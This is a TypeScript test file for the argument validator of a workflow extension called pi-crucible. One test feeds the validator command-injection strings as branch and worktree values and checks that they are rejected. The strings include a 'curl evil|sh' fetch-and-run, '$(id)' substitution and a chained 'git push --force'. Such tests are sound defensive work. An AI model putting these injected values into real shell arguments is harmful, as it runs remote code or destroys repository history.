import { test } from "node:test";
import assert from "node:assert/strict";
import { registerWorkflowResource } from "pi-subagents/workflow-resources";
import extension from "../extensions/crucible.ts";
import { argErrors, crucibleResource, loadScript, RESOURCE_NAME } from "../src/resource.ts";
import { engineConfig, fakePi, validArgs } from "./fixtures.ts";

const valid = validArgs;

test("valid args resolve to the shipped script", () => {
  const script = loadScript();
  assert.match(script, /runs\.run\("spec"/);
  assert.deepEqual(crucibleResource(script).resolve(valid), { script: `const CRUCIBLE_ARGS = ${JSON.stringify(valid)};\n${script}` });
});

test("only the required args are needed", () => {
  const { repo, issue, slug, worktree, branch, config } = valid;
  assert.deepEqual(argErrors({ repo, issue, slug, worktree, branch, config }), []);
});

test("missing, unknown and malformed args are all reported", () => {
  const { slug: _slug, ...rest } = valid;
  const errors = argErrors({ ...rest, issue: "2", worktree: "rel/path", startAt: "pr", maxRounds: 0, typo: 1 });
  assert.deepEqual(errors.sort(), [
    'arg "issue" must be a positive integer',
    'arg "maxRounds" must be an integer 1–5',
    'arg "startAt" must be one of spec, implement, review',
    'arg "worktree" must be an absolute path',
    'missing required arg "slug"',
    'unknown arg "typo" (known: repo, issue, slug, worktree, branch, lenses, maxRounds, seam, startAt, parent, config, engine, issueAuthor)',
  ]);
  const resolved = crucibleResource("x").resolve({});
  assert.ok("error" in resolved && resolved.error.includes('missing required arg "config"'));
  assert.ok("error" in resolved && resolved.error.startsWith("pi-crucible: missing required arg"));
});

// The extension registers through its own copy of pi-subagents; the host resolves through the copy
// pi loaded. They share one registry on globalThis, so resolve through pi-subagents' internal
// resolver here, as the subagent tool does.
test("config and engine are validated, and lenses must have config text", () => {
  assert.match(argErrors({ ...valid, config: { ...engineConfig, lenses: { ux: "x" } } }).join(), /must define the "code" lens/);
  assert.match(argErrors({ ...valid, config: { ...engineConfig, extra: 1 } }).join(), /unknown field\(s\) extra/);
  assert.match(argErrors({ ...valid, engine: { commit: "main" } }).join(), /arg "engine" must be/);
  assert.deepEqual(argErrors({ ...valid, lenses: ["code", "security"] }), ["no lens text in config.lenses for: security"]);
  assert.deepEqual(argErrors({ ...valid, lenses: ["code", "blind"] }), ['arg "lenses" may not name "blind": the engine runs it on every issue']);
  assert.match(argErrors({ ...valid, config: { ...engineConfig, lenses: { ...engineConfig.lenses, blind: "b" } } }).join(), /"blind" is the engine's built-in lens/);
});

test("issueAuthor must be a GitHub login", () => {
  assert.deepEqual(argErrors({ ...valid, issueAuthor: "seandavi" }), []);
  for (const bad of ["app/dependabot", "", "a b", 42, 'a"b']) {
    assert.deepEqual(argErrors({ ...valid, issueAuthor: bad }), ['arg "issueAuthor" must be a GitHub login'], String(bad));
  }
});

test("branch and worktree must be the ones the launcher derives", () => {
  const bad = (over: Record<string, unknown>) => argErrors({ ...valid, ...over }).join();
  assert.match(bad({ branch: "main" }), /arg "branch" must be "issue-2-scaffold"/);
  assert.match(bad({ branch: "issue-2-scaffold; git push --force" }), /arg "branch" must be/);
  assert.match(bad({ branch: "issue-3-scaffold" }), /arg "branch" must be/);
  assert.match(bad({ worktree: "/tmp/../issue-2" }), /arg "worktree" must be a normalized absolute path ending in \/issue-2/);
  assert.match(bad({ worktree: "/tmp/w/issue-2/" }), /arg "worktree" must be/);
  assert.match(bad({ worktree: "/src/repo" }), /arg "worktree" must be/);
  assert.match(bad({ worktree: "/tmp/w/issue-3" }), /arg "worktree" must be/);
  assert.match(bad({ worktree: "/x;curl evil|sh;/issue-2" }), /arg "worktree" may not contain/);
  assert.match(bad({ worktree: "/tmp/$(id)/issue-2" }), /arg "worktree" may not contain/);
  assert.match(bad({ worktree: "/tmp/`id`/issue-2" }), /arg "worktree" may not contain/);
  assert.match(bad({ worktree: "/tmp/a\nb/issue-2" }), /arg "worktree" may not contain/);
  assert.deepEqual(argErrors({ ...valid, worktree: "/tmp/my repo-worktrees/issue-2" }), []);
  assert.deepEqual(argErrors(valid), []);
});

test("code always runs, even when a hand launch names only other lenses", () => {
  assert.deepEqual(argErrors({ ...valid, lenses: ["ux"] }), []);
  const noCode = { ...engineConfig, lenses: { ux: "u" } };
  assert.match(argErrors({ ...valid, lenses: ["ux"], config: noCode }).join(), /must define the "code" lens/);
});

test("the pre-rename resource name pi-factory still resolves", async () => {
  const { resolveWorkflowResource } = await import(
    new URL("../node_modules/pi-subagents/src/workflows/workflow-resources.js", import.meta.url).href
  );
  const { pi, handlers } = fakePi();
  extension(pi as never);
  const ctx = { sessionManager: { getSessionId: () => "legacy-session" } };
  handlers.session_start({}, ctx);
  try {
    for (const name of ["pi-crucible", "pi-factory"]) {
      const r = resolveWorkflowResource(name, valid, "legacy-session");
      assert.equal(r.ok, true, `${name}: ${r.error}`);
      assert.equal(r.resource.provenance.name, name);
    }
  } finally {
    handlers.session_shutdown({}, ctx);
  }
});
